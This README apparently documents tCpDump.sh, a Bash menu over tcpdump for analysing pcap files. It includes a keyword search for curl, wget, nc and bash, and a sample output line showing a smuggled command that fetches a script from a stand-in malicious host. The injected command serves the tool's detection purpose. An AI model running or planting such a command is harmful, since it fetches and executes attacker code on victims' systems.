# Traffic-Analysis-Tools
Better way to analyze traffic
# Traffic Analysis Tools 🚦🔍

This repository contains a collection of tools to help analyze and visualize network traffic captured in PCAP files. These tools aim to provide an intuitive interface and a range of analysis options for enhanced understanding of network behavior.

## Table of Contents 📝
- [Overview](#overview-)
- [Tools](#tools-)
  - [tCpDump.sh](#tcpdumpsh-)
- [Prerequisites](#prerequisites-🛠️)
- [Installation](#installation-⚙️)
- [Usage](#usage-🚀)
- [Features](#features-✨)
- [Contributing](#contributing-🤝)
- [License](#license-📜)
  
## Tools 🧰

### tCpDump.sh 📊
`tCpDump.sh` is an interactive Bash script that streamlines the analysis of pcap files using `tcpdump`. It provides a user-friendly menu with 24 analysis options, enabling you to:
- List source and destination IPs.
- Analyze conversation statistics (sequence and acknowledgment numbers).
- Detect packet retransmissions and anomalous traffic.
- Visualize conversation traces with Chart.js.
- Search for suspicious commands ( `curl`, `wget`) in payloads.

## Prerequisites 🛠️
To use `tCpDump.sh`, ensure the following are installed:
- **tcpdump**: Required for analyzing pcap files.
  - Install on Debian/Ubuntu: `sudo apt-get install tcpdump`
  - Install on Red Hat/CentOS: `sudo yum install tcpdump`
- **geoip-bin** (optional): Enables GeoIP analysis for mapping IPs to locations.
  - Install on Debian/Ubuntu: `sudo apt-get install geoip-bin`
- A Unix-like system with Bash ( Linux, macOS, WSL on Windows).
- PCAP files (`.pcap` or `.pcapng`) for analysis.

## Installation ⚙️
1. Clone the repository:
   ``` 
   git clone https://github.com/your-username/Traffic-Analysis-Tools.git
   cd Traffic-Analysis-Tools
   ```
2 Make the script executable:

Make the script executable:

  ```
   chmod +x tCpDump.sh
   ```

Ensure tcpdump is installed (see Prerequisites).
(Optional) Install geoip-bin for GeoIP support.
Usage 🚀
Run the script and follow the interactive menu:
  ```
   ./tCpDump.sh
  ```
Example Workflow
Select Option 1 to list available pcap files in the current directory.
Select Option 2 to analyze a pcap file (capture.pcap).
Choose from 24 analysis options, such as:
Option 2: Display source and destination IP addresses.
Option 22: Visualize conversation trace (outputs Chart.js config).
Option 24: Search for suspicious commands like curl or wget.
Sample Output
```
Copy
$ ./tCpDump.sh
Please choose an option:
1. List available pcap files
2. Analyze a pcap file
3. Show tcpdump man page (related to pcap)
4. Exit

Option: 2
Enter the pcap file name: capture.pcap
Choose an analysis option:
...
24. Search for suspicious commands
Option: 24
Searching for suspicious commands (curl, wget, nc, bash)...
192.168.1.10.12345 > 93.184.216.34.80: Flags [P.], seq 1:200, ack 1, win 512
GET /?cmd=curl%20http://malicious.com/script.sh HTTP/1.1
Host: example.com
--
Note: Found commands may appear in User-Agent strings, URLs, or payloads. Review context for suspicion.
```
